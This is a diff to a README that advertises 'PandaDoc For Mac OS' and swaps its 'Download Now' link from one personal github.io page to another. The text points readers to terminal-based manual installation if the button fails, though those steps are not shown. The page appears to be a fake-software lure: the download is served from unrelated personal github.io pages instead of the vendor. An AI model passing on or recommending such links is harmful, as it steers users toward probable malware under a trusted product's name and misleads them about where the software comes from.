@@ -3,7 +3,7 @@
 ![banner-pandadoc](https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/PandaDoc_Logo_PNG.png/1200px-PandaDoc_Logo_PNG.png)
 PandaDoc For Mac OS is a powerful, user-friendly document management and e-signature solution designed for macOS users. Streamline your workflow with seamless document creation, signing, and sharing. Follow the instructions below to install PandaDoc on your Mac and unlock its full potential.
 
-> [![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/pandadoc)
+> [![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/pandadoc)
 
 > If the download button doesn’t work, follow the manual installation instructions below using the terminal.
 
